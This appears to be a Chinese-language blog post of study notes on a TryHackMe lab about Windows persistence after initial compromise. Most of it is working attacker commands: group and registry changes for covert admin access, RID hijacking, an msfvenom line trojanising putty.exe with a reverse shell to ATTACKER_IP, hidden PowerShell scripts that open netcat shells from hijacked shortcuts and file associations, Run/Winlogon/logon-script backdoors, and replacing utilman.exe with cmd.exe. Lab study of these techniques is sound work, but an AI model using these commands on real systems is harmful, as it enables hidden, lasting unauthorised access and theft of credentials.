# Windows Local Persistence

在目标的内部网络上获得第一个立足点后，您需要确保在实际到达皇冠上的宝石之前不会失去对它的访问权限。建立持久性是我们作为攻击者在获得网络访问权限时的首要任务之一。简单来说，持久性是指创建替代方法来重新获得对主机的访问权限，而无需重新经历利用阶段。

---

您希望尽快建立持久性的原因有很多，包括：

- 再利用并不总是可能的：一些不稳定的漏洞利用可能会在利用过程中杀死易受攻击的进程，让您对其中一些进行一次攻击。
- 站稳脚跟很难重现：例如，如果您使用网络钓鱼活动来获得首次访问权限，则重复它以重新获得对主机的访问权限简直是太多的工作。您的第二个广告系列也可能效果不佳，使您无法访问网络。
- 蓝队在追捕您：如果检测到您的操作，则用于获得首次访问权限的任何漏洞都可能被修补。你正在与时间赛跑！

---

## 篡改非特权账户

### 分配组成员身份

	net localgroup administrators thmuser0 /add

如果这看起来太可疑，可以使用备份操作员组。此组中的用户没有管理权限，但允许在系统上读取/写入任何文件或注册表项，忽略任何已配置的 DACL。这将允许我们复制SAM和SYSTEM注册表配置单元的内容，然后我们可以使用它来恢复所有用户的密码哈希，使我们能够简单地升级到任何管理帐户。

	net localgroup "Backup Operators" thmuser1 /add

由于这是一个非特权帐户，因此它无法通过 RDP 或 WinRM 返回到计算机，除非我们将其添加到Remote Desktop Users （RDP） 或Remote Management Users （WinRM） 组

	net localgroup "Remote Management Users" thmuser1 /add

**由于用户帐户控制 （UAC）。UAC 实现的功能之一 LocalAccountTokenFilterPolicy 在远程登录时剥夺任何本地帐户的管理权限。虽然可以从图形用户会话通过 UAC 提升权限，但如果使用的是 WinRM，则只能使用没有管理权限的受限访问令牌。**

为了能够重新获得用户的管理权限，我们必须通过将以下注册表项更改为 1 来禁用 LocalAccountTokenFilterPolicy：

	reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

### 特权

特权只是在系统本身上执行任务的能力。

对于备份操作员组，默认情况下分配了以下两个权限：

- SeBackupPrivilege：用户可以读取系统中的任何文件，忽略任何现有的DACL。
- SeRestorePrivilege：用户可以在系统中写入任何文件，忽略任何DACL。

我们可以使用secedit来配置Privilegs

	secedit /export /cfg config.inf

编辑config.inf，将用户名添加进需要的特权

我们最终将 .inf 文件转换为 .sdb 文件，然后用于将配置加载回系统：

	secedit /import /cfg config.inf /db config.sdb
	secedit /configure /db config.sdb /cfg config.inf

### RID劫持

这让我不禁想起 AD中的sid history劫持

**创建用户时，将为其分配一个名为相对 ID （RID） 的标识符。RID 只是一个数字标识符，表示整个系统中的用户。当用户登录时，LSASS 进程从 SAM 注册表配置单元获取其 RID，并创建与该 RID 关联的访问令牌。如果我们可以篡改注册表值，我们可以通过将相同的 RID 关联到两个帐户来使 Windows 将管理员访问令牌分配给非特权用户。**

在任何 Windows 系统中，默认管理员帐户分配的 RID = 500，普通用户通常具有 RID >= 1000。

	wmic useraccount get name,sid

reg path

	HKLM\SAM\SAM\Domains\Account\Users\

每个用户都有一个密钥的位置。由于我们要修改 thmuser3，我们需要搜索一个 RID 的十六进制 （1010 = 0x3F2） 键。在对应的键下，会有一个名为 F 的值

**请注意，RID 是使用小端表示法存储的，因此其字节显示为反向。**

我们现在将这两个字节替换为十六进制 （500 = 0x01F4） 的管理员 RID，并切换字节 （F401），将原始值更改为此值，即可获得与管理员相同的权限

## BackDoor

metasploit生成后门文件

	msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe

### 快捷方式劫持

在劫持快捷方式的目标之前，让我们在或任何其他偷偷摸摸的位置创建一个简单的 Powershell 脚本。该脚本将执行反向 shell，然后从快捷方式属性上的原始位置运行 calc.exe

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
C:\Windows\System32\calc.exe
```

msf生成payload也可以

最后，我们将更改快捷方式以指向我们的脚本。请注意，执行此操作时，快捷方式的图标可能会自动调整。请务必将图标指向原始可执行文件，以便用户不会看到任何可见的更改。

	powershell.exe -WindowStyle hidden backdoor.ps1

### 文件关联劫持

我们还可以劫持任何文件关联，以强制操作系统在用户打开特定文件类型时运行 shell。

默认的操作系统文件关联保存在注册表中，HKLM\Software\Classes\其中存储了 下每个文件类型的密钥。假设我们要检查哪个程序用于打开.txt文件;我们可以去检查子项，并找到与之关联的编程 ID（ProgID）。ProgID 只是系统上安装的程序的标识符。

![在这里插入图片描述](https://img-blog.csdnimg.cn/8b028f4de8c94e9e8ba559359f588762.png)

然后我们可以搜索相应 ProgID 的子项（也在HKLM\Software\Classes\下 ），在这种情况下， txtfile ，我们将在其中找到对负责处理.txt文件的程序的引用。大多数 ProgID 条目都有一个子项，其中shell\open\command指定了要为具有该扩展名的文件运行的默认命令：

![在这里插入图片描述](https://img-blog.csdnimg.cn/e36fc4a64b8f4af09511b6082da9e21f.png)

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

**请注意，在Powershell中 $args[0]，我们必须传递到记事本，%1因为它将包含要打开的文件的名称。**

	powershell.exe -WindowStyle hidden backdoor.ps1 %1

## 滥用服务

这个没少用，比较熟悉了

记一条命令，查询所有服务：

	sc.exe query state=all

## 滥用计划任务

### 隐藏计划任务

我们可以通过删除其安全描述符 （SD） 来使其对系统中的任何用户不可见。安全描述符只是一个 ACL，用于说明哪些用户有权访问计划任务。如果你的用户不被允许查询计划任务，你将无法再看到它，因为 Windows 只显示你有权使用的任务。删除 SD 等效于禁止所有用户（包括管理员）访问计划任务。

	HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\

![在这里插入图片描述](https://img-blog.csdnimg.cn/f4696bd26f6341e9b076b813d1d83356.png)

## 用户登录触发

单个用户登录 自启动文件夹

	C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

所有用户登录时

	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

### Run / RunOnce

- HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
- HKLM\Software\Microsoft\Windows\CurrentVersion\Run
- HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

HKCU针对当前用户，HKLM针对机器所有用户

每次用户登录时，Run下指定的任何程序都将运行。在RunOnce下指定的程序将只执行一次。

	reg add hklm\software\microsoft\windows\currentVersion\Run /t REG_EXPAND_SZ /v backdoor /d c:\backdoor.exe

### WinLogon

登录时自动启动程序的另一种替代方法是滥用Winlogon，Winlogon是在身份验证后立即加载用户配置文件的Windows组件（以及其他内容）。

Winlogon使用一些注册表项，这些注册表项可能会很有趣以获得持久性：HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\

- Userinit指向  userinit.exe，它负责恢复您的用户配置文件首选项。
- shell指向系统的shell，通常为 explorer.exe。

![在这里插入图片描述](https://img-blog.csdnimg.cn/09cd3c92ddca4bb6ac5e8f090edf87b1.png)

Userinit中可以指定多个程序，因此我们可以将后门添加进去

### 登录脚本

userinit.exe加载用户配置文件时要执行的操作之一是检查名为UserInitMprLogonScript的环境变量。我们可以使用此环境变量将登录脚本分配给将在登录计算机时运行的用户。

默认情况下不会设置变量，因此我们可以创建它并分配我们喜欢的任何脚本。

	reg add hkcu\Environment /t REG_EXPAND_SZ /v UserInitMprLogonScript /d c:\backdoor.exe

请注意，此注册表项在HKLM中没有等效项，因此后门程序仅适用于HKCU 当前用户。

## RDP中的后门

人均都会了这个

- C:\Windows\System32\sethc.exe
- C:\Windows\System32\Utilman.exe

	takeown /f c:\Windows\System32\utilman.exe
	icacls C:\Windows\System32\utilman.exe /grant Administrator:F
	copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe

## 滥用现有的服务

典型的 Web 服务器设置中植入后门。

这个更不用说了，向web服务器植入webshell、reverse shell等等，甚至是搭建http隧道 [neoreg](https://github.com/L-codes/Neo-reGeorg)

[TryHackMe](https://tryhackme.com/room/windowslocalpersistence)